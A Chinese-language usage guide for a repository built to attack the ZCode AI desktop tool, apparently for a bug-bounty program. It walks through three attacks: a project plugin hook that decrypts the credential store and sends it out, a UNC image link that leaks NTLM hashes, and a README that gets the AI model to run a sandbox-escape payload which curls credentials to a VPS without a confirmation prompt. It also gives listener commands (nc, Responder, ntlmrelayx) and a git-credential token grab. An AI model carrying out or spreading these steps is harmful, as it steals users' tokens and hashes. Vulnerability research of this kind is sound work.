# 恶意仓库使用说明（真实模拟攻击）

## 仓库结构

```
zsrc-malrepo/
├── report-08-credentials/     # 报告 08（凭据库解密）
│   ├── .zcode-plugin/
│   │   └── plugin.json        # 插件清单（含 SessionStart hook）
│   ├── hooks/
│   │   └── session-start.mjs  # hook 脚本（读取并解密凭据库）
│   ├── README.md              # 伪装成视频处理工具集
│   ├── package.json
│   └── .env
├── report-09-unc/             # 报告 09（UNC 凭证外泄）
│   ├── README.md              # 含 UNC 图片链接的恶意 markdown
│   └── package.json
└── report-10-snippet/         # 报告 10（沙箱逃逸）
    ├── README.md              # 诱导调用 EvalWorkflowSnippet
    ├── package.json
    ├── a2f1-probe.ts          # 沙箱逃逸 payload
    └── env-check.ts           # 良性环境诊断脚本（备用）
```

## 使用前准备

### 1. 替换 VPS 域名

将所有文件中的 `47.120.66.116` 替换为实际 VPS 域名：

```bash
# Windows Git Bash
find . -type f -name "*.md" -o -name "*.ts" -o -name "*.mjs" | xargs sed -i 's/vps\.your-domain\.com/your-actual-vps.com/g'
```

### 2. 推送到 GitHub

按老大提供的操作步骤推送到 noobxiaomeng 下：

```bash
# 1. 创建仓库（用本机已存的 GitHub 凭证调 API）
curl -X POST \
  -H "Authorization: token $(printf "protocol=https\nhost=github.com\n" | git credential fill | grep ^password= | cut -d= -f2)" \
  -H "Accept: application/vnd.github+json" \
  https://api.github.com/user/repos \
  -d '{"name":"zsrc-malrepo","private":false}'

# 2. 本地 git init
cd F:/tmp/zsrc-malrepo
git init -b main
echo "node_modules/" > .gitignore
echo "dist/" >> .gitignore
echo "*.log" >> .gitignore
echo ".env" >> .gitignore

# 3. 提交署名
git config user.name "noobxiaomeng"
git config user.email "noobxiaomeng@users.noreply.github.com"
git add -A
git commit -m "Initial commit: video toolkit"

# 4. 推送（代理单条注入）
git remote add origin https://github.com/noobxiaomeng/zsrc-malrepo.git
git -c http.proxy=http://127.0.0.1:7897 -c https.proxy=http://127.0.0.1:7897 push -u origin main
```

## 受害者复现步骤

### 报告 08（凭据库解密）

1. 受害者电脑（另一账号）clone 仓库：
   ```bash
   git clone https://github.com/noobxiaomeng/zsrc-malrepo.git
   cd zsrc-malrepo/report-08-credentials
   ```

2. 受害者用 ZCode 桌面版打开该目录

3. ZCode 自动加载项目级插件（`.zcode-plugin/plugin.json` 中的 SessionStart hook）

4. hook 脚本自动运行，读取 `%USERPROFILE%\.zcode\v2\credentials.json`，推导密钥，解密，外传至 VPS

5. VPS 查看回调（`nc -lvnp 443 > callback.log` 或 HTTP 服务日志）

### 报告 09（UNC 凭证外泄）

1. 受害者电脑（另一账号）clone 仓库：
   ```bash
   git clone https://github.com/noobxiaomeng/zsrc-malrepo.git
   cd zsrc-malrepo/report-09-unc
   ```

2. 受害者用 ZCode 桌面版打开该目录

3. 受害者执行任意 workflow（或打开 workflow artifact）

4. `WorkflowArtifactBody.tsx` 的 `MessageResponse` 不传 workspacePath → UNC 图片走绝对路径分支 → `readMediaPreview` → `stat` → SMB 认证到 VPS

5. VPS 启动 Responder 监听（`responder -I eth0 -wrf`），捕获 NetNTLMv2 哈希

### 报告 10（沙箱逃逸）

1. 受害者电脑（另一账号）clone 仓库：
   ```bash
   git clone https://github.com/noobxiaomeng/zsrc-malrepo.git
   cd zsrc-malrepo/report-10-snippet
   ```

2. 受害者用 ZCode 桌面版打开该目录

3. 受害者在聊天框输入「按 README 流程开工」

4. 模型读取 README 后按其指示调用 `Skill(dynamic-workflows)` → 调用 `EvalWorkflowSnippet` 并传入 `a2f1-probe.ts`

5. 全程零确认弹窗，curl 外传凭据到 VPS

6. VPS 查看回调

## VPS 接收端部署

### HTTP 回调接收（报告 08/10）

```bash
# 简单 netcat 接收
nc -lvnp 443 > callback.log

# 或 Python HTTP 服务
python3 -m http.server 443 --bind 0.0.0.0

# 或专用 webhook 服务（推荐）
# 使用 webhook.site 或 requestbin.com 生成临时回调地址
```

### SMB 监听（报告 09）

```bash
# 安装 Responder（Kali Linux 自带）
responder -I eth0 -wrf

# 或 ntlmrelayx（relay 场景）
ntlmrelayx.py -tf targets.txt -smb2support

# 查看捕获的哈希
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt
```

## 危害验证

### 报告 08（凭据库解密）

VPS 回调中应包含：
- `zcodejwttoken`（ZCode JWT）
- `oauth:bigmodel:access_token`（BigModel OAuth access token）
- `account-provider:...:api-key`（Coding Plan API key）
- `web-remote-control:external-relay:pass_hash`（远控配对 hash）
- `oauth:bigmodel:user_info`（用户完整信息）

### 报告 09（UNC 凭证外泄）

Responder 终端应显示：
```
[SMB] NTLMv2-SSP Client   : <受害者IP>
[SMB] NTLMv2-SSP Username : <DOMAIN>\<username>
[SMB] NTLMv2-SSP Hash     : <NetNTLMv2 hash>
```

### 报告 10（沙箱逃逸）

VPS 回调中应包含：
- `credentials.json` 的完整内容（zcodejwttoken、bigmodel access_token、api-key 等）

## 注意事项

1. **仅用于授权安全测试**：本仓库仅用于 ZSRC 漏洞验证，请遵守相关法律法规
2. **测试后清理**：测试完成后删除 GitHub 仓库，避免被他人滥用
3. **VPS 日志清理**：测试完成后清理 VPS 上的回调日志，避免敏感信息泄露
4. **受害者账号保护**：测试使用专用测试账号，避免影响真实用户
